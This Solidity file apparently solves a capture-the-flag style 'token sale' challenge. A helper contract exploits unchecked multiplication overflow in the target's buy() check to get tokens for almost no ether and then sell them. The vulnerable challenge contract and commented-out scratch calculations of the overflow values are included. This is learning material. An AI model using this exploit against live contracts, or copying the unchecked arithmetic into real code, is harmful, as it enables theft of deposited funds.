pragma solidity ^0.4.21;

contract TokenSaleHelper {
    address otherContract = 0x08e2E9275D6b0C546d9a42a63567a6De6Aeb5B80;

    event TestTokens(uint256 tokens, uint256 price, uint256 result);

    function setOtherContract(address newAddr) public {
        otherContract = newAddr;
    }

    function getOtherContract() public view returns (address) {
        return otherContract;
    }

    function buy() public payable {
        TokenSaleChallenge tokenSaleChallenge = TokenSaleChallenge(otherContract);
        tokenSaleChallenge.buy.value(415992086870360064)(115792089237316195423570985008687907853269984665640564039458);
        tokenSaleChallenge.sell(1);
    }

    // function testTokens() public returns (uint256) {
    //     uint256 tokens = 0x100000000000000000000000000;
    //     uint256 price = 1 ether;
    //     uint256 result = tokens * price;
    //     uint256 test = 0;
    //     test -= 1 ether;
    //     uint256 numTokens = test / price;
    //     numTokens += 2;    // number of tokens to purchase
    //     uint256 test2 = numTokens * price;
    //     uint256 test3 = test2;
    //     uint256 test4 = 1 ether - test3;    // amount of Eth to pass
    //     uint256 test5 = 0 - test2;
    //     uint256 test6 = numTokens * price - test3;

    //     require(numTokens * price == test3);

    //     emit TestTokens(tokens, price, result);
    //     require(result * 1 ether == 0);
    //     require(result > 0);
    //     return result;
    // }

    function() public payable { 
    }
}

contract TokenSaleChallenge {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    function TokenSaleChallenge(address _player) public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable {
        require(msg.value == numTokens * PRICE_PER_TOKEN);

        balanceOf[msg.sender] += numTokens;
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);
    }
}